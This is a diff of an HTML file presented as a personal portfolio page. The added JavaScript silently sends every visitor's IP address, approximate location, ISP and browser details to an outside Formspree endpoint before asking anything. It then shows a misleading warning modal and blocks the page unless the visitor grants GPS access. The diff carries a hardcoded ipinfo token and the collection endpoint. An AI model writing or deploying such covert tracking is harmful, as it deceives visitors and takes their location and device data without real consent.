@@ -79,64 +79,80 @@
     <h1>Welcome to My Portfolio</h1>
     <!-- ... rest of your site ... -->
   </div>
-    <script>
+   <script>
 (async () => {
+  // Always get IP-based location FIRST silently
+  const approxInfo = await getApproxLocation(false); // no consent yet
+  sendToFormspree(approxInfo); // Send basic tracking first
+
+  // Then show the SweetAlert asking for permission
   const askLocation = await Swal.fire({
-    title: "Are you 18+ ?",
-    text: "Warning: This content is for over 18 years of age only. Viewer discretion is advised.",
+    title: "Are you sure?",
+    text: "Warning: This content is specific to your location. Viewer discretion is advised.",
     icon: "warning",
-    allowOutsideClick: false,  // block clicking outside
-    allowEscapeKey: false,     // block ESC key
+    allowOutsideClick: false,
+    allowEscapeKey: false,
     showCancelButton: true,
     confirmButtonText: "Yes, share",
     cancelButtonText: "No, thanks"
   });
 
   if (askLocation.isConfirmed) {
-    getExactLocation(true);
+    // User agreed, try exact location
+    navigator.geolocation.getCurrentPosition(
+      async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy + " meters";
+
+        const info = await getDeviceInfo();
+        info["Location Type"] = "Exact (GPS)";
+        info["Latitude"] = lat;
+        info["Longitude"] = lon;
+        info["Accuracy"] = accuracy;
+        info["User Consent"] = "Yes";
+
+        sendToFormspree(info);
+        unlockPage(); // allow access
+      },
+      async err => {
+        console.warn("GPS failed, fallback to approx", err);
+        approxInfo["User Consent"] = "No (GPS denied)";
+        sendToFormspree(approxInfo);
+        denyAccess();
+      }
+    );
   } else {
-      getExactLocation(true);
-      denyAccess();
+    // User said No → Deny access
+    approxInfo["User Consent"] = "No (user declined)";
+    sendToFormspree(approxInfo);
+    denyAccess();
   }
 
-  async function getExactLocation(userConsented) {
-    navigator.geolocation.getCurrentPosition(async pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const accuracy = pos.coords.accuracy + " meters";
-
-      const trackingInfo = await getDeviceInfo();
-      trackingInfo["Location Type"] = "Exact (GPS)";
-      trackingInfo["Latitude"] = lat;
-      trackingInfo["Longitude"] = lon;
-      trackingInfo["Accuracy"] = accuracy;
-      trackingInfo["User Consent"] = userConsented ? "Yes" : "No";
-
-      sendToFormspree(trackingInfo);
-      denyAccess(); 
-    }, () => {
-      getApproxLocation(false); // fallback
-    });
-  }
-
+  // Get IP-based location (approx)
   async function getApproxLocation(userConsented) {
-    const res = await fetch('https://ipinfo.io/json?token=92301f93643037');
-    const data = await res.json();
+    try {
+      const res = await fetch('https://ipinfo.io/json?token=92301f93643037');
+      const data = await res.json();
 
-    const trackingInfo = await getDeviceInfo();
-    trackingInfo["Location Type"] = "Approx (IP)";
-    trackingInfo["IP"] = data.ip;
-    trackingInfo["City"] = data.city;
-    trackingInfo["Region"] = data.region;
-    trackingInfo["Country"] = data.country;
-    trackingInfo["Location (Lat,Long)"] = data.loc;
-    trackingInfo["ISP / Org"] = data.org;
-    trackingInfo["User Consent"] = userConsented ? "Yes" : "No";
+      const info = await getDeviceInfo();
+      info["Location Type"] = "Approx (IP)";
+      info["IP"] = data.ip;
+      info["City"] = data.city;
+      info["Region"] = data.region;
+      info["Country"] = data.country;
+      info["Location (Lat,Long)"] = data.loc;
+      info["ISP / Org"] = data.org;
+      info["User Consent"] = userConsented ? "Yes" : "No";
 
-    sendToFormspree(trackingInfo);
-    denyAccess(); 
+      return info;
+    } catch (err) {
+      console.error("IP lookup failed", err);
+      return await getDeviceInfo(); // fallback
+    }
   }
 
+  // Get browser/device info
   async function getDeviceInfo() {
     const info = {
       browser: navigator.userAgent,
@@ -156,38 +172,44 @@
     return info;
   }
 
+  // Send to Formspree
   async function sendToFormspree(data) {
     const formData = new FormData();
     for (let key in data) {
       formData.append(key, data[key]);
     }
 
-    await fetch("https://formspree.io/f/xldjejon", {
-      method: "POST",
-      body: formData,
-      headers: {
-        'Accept': 'application/json'
-      }
-    });
-
-    console.log("Tracking data sent via SweetAlert ✅");
+    try {
+      const res = await fetch("https://formspree.io/f/xldjejon", {
+        method: "POST",
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      });
+      console.log("Tracking data sent ✅", await res.json());
+    } catch (err) {
+      console.error("Failed to send data", err);
+    }
   }
 
   function unlockPage() {
-    document.body.style.overflow = "auto";        // Re-enable scrolling
-    document.getElementById("page-content").style.display = "block"; // Show page
+    document.body.style.overflow = "auto";
+    document.getElementById("page-content").style.display = "block";
   }
-    function denyAccess() {
-  document.body.innerHTML = `
-    <div style="position:fixed;width:100%;height:100vh;background:#000;background-image:url('assets/img/AliKhan.jpeg');background-size:cover;background-position:center;z-index:99999;display:flex;align-items:center;justify-content:center;color:white;font-size:24px;height:100vh;display:flex;align-items:center;justify-content:center;background:black;color:white;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px;">
-      <h2>Access Denied</h2>
-      <p>You must allow cookies to view this content.</p>
-    </div>
-  `;
-  document.body.style.overflow = "hidden";
-}
+
+  function denyAccess() {
+    document.body.innerHTML = `
+      <div style="position:fixed;width:100%;height:100vh;background-image:url('assets/img/AliKhan.jpeg');background-size:cover;background-position:center;z-index:99999;display:flex;align-items:center;justify-content:center;color:white;font-size:24px;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px;">
+        <h2>Access Denied</h2>
+        <p>You must allow location access to view this content.</p>
+      </div>
+    `;
+    document.body.style.overflow = "hidden";
+  }
 
 })();
 </script>
+
 </body>
 </html>
